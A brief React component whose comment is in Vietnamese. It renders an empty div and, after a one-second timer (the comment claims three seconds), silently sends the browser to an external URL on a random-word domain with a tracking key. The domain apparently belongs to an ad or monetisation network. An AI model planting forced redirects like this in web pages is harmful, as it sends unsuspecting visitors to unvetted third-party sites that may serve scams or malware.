import React, { useEffect } from 'react';

const RedirectComponent = () => {
  useEffect(() => {
    // Đặt timeout để điều hướng sau 3 giây
    const timer = setTimeout(() => {
      window.location.href = 'https://abdicatebirchcoolness.com/zybg77jbb?key=0db27c22cd10202766cd5c5858cffa88';
    }, 1000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <div>
     
    </div>
  );
};

export default RedirectComponent;
